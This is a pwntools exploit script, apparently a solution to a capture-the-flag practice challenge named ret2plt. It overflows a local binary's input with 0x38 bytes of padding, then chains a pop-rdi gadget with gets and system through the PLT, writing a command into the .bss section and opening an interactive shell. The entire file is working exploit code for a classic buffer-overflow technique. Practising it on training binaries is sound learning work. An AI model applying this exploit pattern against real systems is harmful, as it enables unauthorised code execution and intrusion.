#!usr/bin/python3

from pwn import *

context.arch = 'amd64'

y = process( '/home/cuteleo/workspace/pwn/ntu_ctf_demo/basic/ret2plt/ret2plt' )
#pause()

pop_rdi = 0x00000000004007d3
gets_plt = 0x00000000004005a0
system_plt = 0x0000000000400590
bss = 0x6010c0

p = flat(
    'a' * 0x38,
    pop_rdi,
    bss,
    gets_plt,
    pop_rdi,
    bss,
    system_plt
)

y.sendlineafter( ':D' , p)

y.interactive()
